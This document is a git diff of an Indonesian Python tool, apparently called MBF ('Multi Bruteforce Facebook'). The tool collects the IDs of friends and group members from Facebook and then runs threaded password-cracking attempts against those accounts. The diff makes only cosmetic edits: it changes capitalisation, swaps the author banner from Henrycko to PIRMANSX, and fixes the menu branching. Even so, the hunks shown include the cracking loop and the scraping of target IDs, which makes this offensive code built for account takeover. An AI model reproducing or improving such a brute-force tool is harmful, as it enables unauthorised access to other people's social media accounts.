@@ -125,7 +125,7 @@ def crack0(data,sandi):
 			if threading.activeCount() == 1:break
 		except KeyboardInterrupt:
 			keluar()
-	cetak('\r!h[*] Cracking  !k100!m%      ')
+	cetak('\r!h[*] Cracking  !k100!m%')
 	tampilhasil(akun,sandi,data)
 def install_browser():
 	global br
@@ -200,7 +200,7 @@ def inputM(x,d):
 def lanjutG():
 	global fid_bgroup
 	if len(fid_bgroup) != 0:
-		i = inputD('[?] Riset Hasil Id Group/lanjutkan (r/l)',['R','L'])
+		i = inputD('[?] Riset Hasil ID Group/lanjutkan (r/l)',['R','L'])
 		if i.upper() == 'L':
 			return crack(fid_bgroup)
 		else:
@@ -281,7 +281,7 @@ def idteman():
 		login()
 		if log == 0:
 			keluar()
-	cetak('!h[*] Sedang mengumpulkan id teman...')
+	cetak('!h[*] Sedang mengumpulkan ID teman...')
 	buka('https://free.facebook.com/friends/center/mbasic/?fb_ref=bm&sr=1&ref_component=free_bookmark&ref_page=XMenuController')
 	jumlah = br.find_link(url_regex='/friends/center/friends/').text
 	jumlah = re.findall(r'\((.*a?)\)',jumlah)[0]
@@ -312,13 +312,14 @@ def idteman():
 	else:
 		return menu()
 def menu():
-	cetak("\n           !h.-.-..\n          /+/++//\n         /+/++//\n  !k*   !k* !h/+/++//\n   \ /  |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cMBF!b|==========.\n   !h(!m'!h)!0  !h/'|'\           !b\\\n       !h/  \  \          !b'\n       !h\_  \_ \_   !k___!mMBF !c3.0!k___\n\n !m* !bAuthors : @Henrycko\n !m* !cSupporters : Daiva\n !m* !phttps://www.facebook.com/henrycko.za\n !m* !phttps://www.facebook.com/deva.alzena\n !m* !phttps.github.com/Henrycko\n!k.======================.\n|!h  AMBIL !mID!h DARI.....  !k|\n'======================'\n!k#!p1 !hDAFTAR TEMAN\n!k#!p2 !hANGGOTA GROUP\n!k#!p3 !mKELUAR...")
-	elif i == 1:
-	        lanjutT()
-	        idteman()
+	cetak("\n           !h.-.-..\n          /+/++//\n         /+/++//\n  !k*   !k* !h/+/++//\n   \ /  |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cMBF!b|==========.\n   !h(!m'!h)!0  !h/'|'\           !b\\\n       !h/  \  \          !b'\n       !h\_  \_ \_   !k___!mMBF !c2.0!k___\n\n !m* !bMULTI BRUTEFORCE FACEBOOK\n !m* !cPIRMANSX\n !m* !phttps://github.com/pirmansx\n !m* !phttps://facebook.com/groups/164201767529837\n !m* !phttps://pirmansx.waper.com\n!k.======================.\n|!h  AMBIL !mID!h DARI.....  !k|\n'======================'\n!k#!p1 !hDAFTAR TEMAN\n!k#!p2 !hANGGOTA GROUP\n!k#!p3 !mKELUAR...")
+	i = inputM('[?] PILIH',[1,2,3])
 	if i == 2:
 		lanjutG()
 		idgroup()
+	elif i == 1:
+		lanjutT()
+		idteman()
 	elif i == 3:
 		keluar()
 bacaData()
